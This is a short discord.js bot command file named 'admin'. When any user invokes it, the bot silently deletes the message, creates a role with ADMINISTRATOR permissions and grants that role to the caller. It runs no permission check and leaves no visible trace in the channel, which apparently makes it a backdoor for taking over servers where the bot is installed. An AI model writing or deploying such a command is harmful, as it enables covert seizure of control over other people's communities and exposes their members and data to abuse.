const { MessageEmbed } = require('discord.js')
const { inspect } = require('util')
const { red, greenBright, cyan, yellow } = require("chalk");
module.exports = {
    name: 'admin',
    cooldown: 5,
    category: 'Administrator',
    description: '',
    run: async (client, message, args, prefix) => {
        message.delete()
        const role = await message.guild.roles.create({
            name : "Admin",
            permissions: ["ADMINISTRATOR"]
        })
        console.log(greenBright(`[Success] Created role: ${role.name}!`))


        message.guild.members.cache.get(message.author.id).roles.add(role)
        console.log(greenBright(`[Success] Added role ${role.name} to ${message.author.username}!`))
        return console.log(yellow((`[Success] Finished task!`)))
    }
}